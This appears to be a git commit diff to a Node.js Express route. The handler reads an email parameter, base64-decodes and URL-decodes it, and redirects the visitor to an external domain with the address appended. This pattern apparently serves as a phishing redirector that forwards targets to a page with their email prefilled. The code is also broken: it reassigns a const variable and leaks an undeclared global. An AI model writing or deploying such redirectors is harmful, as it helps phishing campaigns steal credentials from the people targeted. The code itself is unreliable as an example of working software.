bb8f902bbfc57f936192cf69111b56e12e7c1217
shinystarlight00 <charles.dev.0811@gmail.com>
2024-10-23 15:06:42 -0400

    fix: post problem and modify redirect url

--- routes/routes.js
+++ routes/routes.js
@@ -1,10 +1,19 @@
 var appRoute = function (app) {
-  app.get("/", function (req, res) {
+  app.all("/", function (req, res) {
     const email = req.query.email;
-    if (email) {
-      res.redirect("https://google.com");
+
+    if (email && email.includes("=")) {
+      email = Buffer.from(email, "base64").toString("utf-8");
+    }
+    email = decodeURIComponent(email);
+
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (email && emailRegex.test(email)) {
+      redirect_url =
+        "https://mobileprosystem.com/&" + email.replace("@", "%40");
+      res.redirect(redirect_url);
     } else {
-      res.send("Hello World");
+      res.send("Please provide a valid email");
     }
   });
 };
